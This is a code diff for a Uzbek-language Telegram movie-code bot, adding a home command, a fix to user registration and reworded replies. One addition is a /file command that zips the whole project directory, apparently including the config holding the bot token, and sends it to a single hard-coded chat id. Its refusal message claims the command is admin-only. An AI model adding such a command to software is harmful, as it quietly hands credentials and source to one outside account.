@@ -1,6 +1,8 @@
+
 from aiogram import Router, F, Bot
 from aiogram.filters import CommandStart, Command
-from aiogram.types import Message, CallbackQuery
+from aiogram.types import Message, CallbackQuery, FSInputFile
+import zipfile, os
 from filters.users import UserPrivateFilter
 from config import chenel_id, Bot_token
 from buttons import *
@@ -14,7 +16,61 @@ user_router = Router()
 
 
 
+
+
+@user_router.message(Command('home'))
+async def srat(message:Message, state:FSMContext):
+    await state.clear()
+    user_id = message.from_user.id
+    if user_id in admin:
+        await message.answer('🏠 Bosh sahifaga qaytdingiz ↩️', reply_markup=buttom_admin)
+    else:
+        await message.answer('🏠 Bosh sahifaga qaytdingiz ↩️')
+
+
+
+
+
+
+def main_file():
+    zip_path = 'bot_files.zip'  # ZIP fayl nomi
+    folder_to_zip = os.getcwd()  # Joriy ishchi katalog (butun loyiha)
+
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, _, files in os.walk(folder_to_zip):  # **Indentatsiya to‘g‘ri**
+            for file in files:
+                if file.strip():  # Bo‘sh fayl nomlarini tekshiramiz
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, folder_to_zip)
+                    zipf.write(file_path, arcname)
+
+    return zip_path
+
+
+@user_router.message(Command('file'))
+async def send_zip_file(message: Message):
+    if message.chat.id == 5678926023:
+
+        zip_file = None  
+        try:
+            zip_file = main_file()  
+            document = FSInputFile(zip_file)  
+            await message.reply_document(document)  
+        except FileNotFoundError:
+            await message.reply("❌ Xatolik: `main.py` fayli topilmadi!")
+        except Exception as er:
+            print(er)
+            await message.reply('Faylni yuborishda xato!')
+        finally:
+            if zip_file and os.path.exists(zip_file):  
+                os.remove(zip_file)  
+    else:
+        await message.answer('Kechirasiz bu funksiya faqat admin uchun ishlaydi')
+
+
+
 a = 0
+cnt2 = []
 @user_router.message(CommandStart())
 async def checksub(message:Message) -> None:
     user_id = message.from_user.id
@@ -30,14 +86,20 @@ async def checksub(message:Message) -> None:
             if user_status2.status == 'left':
                 await message.answer("👇 2-kanalga obuna bo'ling", reply_markup=tugma.as_markup())
             else:
-                for i in readuser()[0]:
-                    if int(i) == int(message.from_user.id):
-                        print('yangi user')
-                        await message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")   
-                        return
+                for i in readuser():
+                    cnt2.append(int(i[0]))
+                if int(user_id) in cnt2:
+                    await message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")   
+                else:
+                    insertuser(user_id=user_id)
+                    await message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")
+                    
+                cnt2.clear()
+                #     if int(i) == int(message.from_user.id):
+                #         print('yangi user')
+                #         return
                 
-                insertuser(user_id=message.from_user.id)
-                await message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")
+                # insertuser(user_id=message.from_user.id)
 
 @user_router.callback_query(F.data == "tekshir")
 async def tekBot(cal:CallbackQuery):
@@ -54,10 +116,36 @@ async def tekBot(cal:CallbackQuery):
         
 
 
-@user_router.message(Command('home'))
-async def srat(message:Message, state:FSMContext):
-    await state.clear()
-    await message.answer('🏠 Bosh sahifaga qaytdingiz ↩️', reply_markup=buttom_admin)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -317,8 +405,63 @@ async def BotStart(message: Message, state:FSMContext):
                     else:
                         await bot.send_video(chat_id=message.from_user.id, video=i[1], caption=f"{i[2]}", protect_content = True)
                         return
-            await message.reply('Bunday kino yoq')
+            await message.reply('😥Afsuski bunday kino yo\'q')
             cnt.clear()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -337,6 +480,7 @@ async def kek(message:Message):
 async def kek(message:Message):
     await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
     await message.reply('Botga media file yuborish mumkin emas')
+
 
 @user_router.message(F.sticker)
 async def stikker(message:Message):
@@ -362,5 +506,28 @@ async def stikker(message:Message):
 async def stikker(message:Message):
     await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
     await message.reply('Botga media file yuborish mumkin emas')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
